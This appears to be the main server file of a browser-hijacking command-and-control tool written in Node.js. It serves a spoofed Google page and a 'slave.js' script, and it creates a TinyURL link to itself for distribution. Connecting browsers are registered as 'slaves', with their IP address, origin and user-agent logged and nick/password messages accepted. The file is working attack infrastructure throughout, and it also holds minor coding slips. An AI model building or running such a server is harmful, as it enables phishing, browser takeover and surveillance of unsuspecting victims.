var repl = require('repl');
var path = require('path');
var commands = require('./src/Commands.js');
var config = require('./config.js');
var clients = require('./src/client/Clients.js');
var output = require('./src/Utils.js');
var wss = require('./src/WebSocketServerFactory.js');
var repl = require('./src/Repl.js');
var express = require('express');
var request  = require('request');
var app = express();

app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname + '/templates/google/googleDk.html'));
});
app.get('/js', function (req, res) {
  res.sendFile(path.join(__dirname + '/public/slave.js'));
});

var server = app.listen(config.ws.port, function () {
  var webServer = server.address();
  console.log(
    'webserver running at %s:%s',
    webServer.address,
    webServer.port
  );
  var alias = 'magicSquick32';
  request.get(
    'http://tinyurl.com/api-create.php?url=http://'+config.ws.host+':'+config.ws.port,
    function (error, response, body) {
        console.log(body);
    }
  );
});

wss.on('connection', (ws) => {
  var clientId = clients.add(
    ws.upgradeReq.connection.remoteAddress,
    ws.upgradeReq.headers.origin,
    ws.upgradeReq.headers['user-agent'],
    ws._sender
  );
  output('Slave #'+clientId+' connected.');

  ws.on('close', () => {
    clients.remove(this.Id);
    output('Slave #'+clientId+' Disconnected.');
  });

  ws.on('message', (data) => {
    try {
      var entity = JSON.parse(data);
    } catch (exception) {
      if(config.debug) {
        console.log('exception');
      }
      var entity = {
        type: null
      };
    }
    switch(entity.type) {
      case 'nick':
        clients.identify(clientId, entity.nick);
        break;
      case 'auth':
        clients.auth(
          clientId,
          entity.nick,
          entity.pass
        );
        break;
    }
  });
});

if(config.repl) {
  repl.start();
}
